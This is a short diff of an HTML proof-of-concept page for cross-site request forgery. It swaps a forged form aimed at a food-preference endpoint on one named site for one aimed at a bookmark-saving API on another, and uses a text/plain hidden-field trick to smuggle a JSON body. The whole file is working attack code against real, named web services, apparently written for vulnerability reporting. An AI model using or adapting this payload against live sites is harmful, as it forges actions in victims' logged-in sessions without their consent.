@@ -1,21 +1,16 @@
-
-
 <!DOCTYPE html>
 <html>
+<head>
+  <title>CSRF PoC - Save Bookmark</title>
+</head>
 <body>
-  <h2>CSRF PoC - Food Preference</h2>
+  <h2>CSRF PoC - Save Bookmark</h2>
 
-  <form action="https://profil.monxtra.be/manage-profile/food-preferences?_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2F_layout%2Findex"
+  <form action="https://www.powerpak.com/ws/api.asmx/save_bookmark"
         method="POST"
-        enctype="application/x-www-form-urlencoded">
+        enctype="text/plain">
 
-    <input type="hidden" name="hasAcceptedConsents" value="true">
-    <input type="hidden" name="code" value="PREF_EGGS_NEW">
-    <input type="hidden" name="category" value="CAT_ALLERGY">
-    <input type="hidden" name="isLastPreference" value="true">
-    <input type="hidden" name="shouldBecomeActive" value="true">
-    <input type="hidden" name="isCurrentlyActive" value="false">
-    <input type="hidden" name="isLastPreference" value="false">
+    <input type="hidden" name='{"entity_id":"124041"}' value="">
 
     <button type="submit">Submit CSRF</button>
   </form>
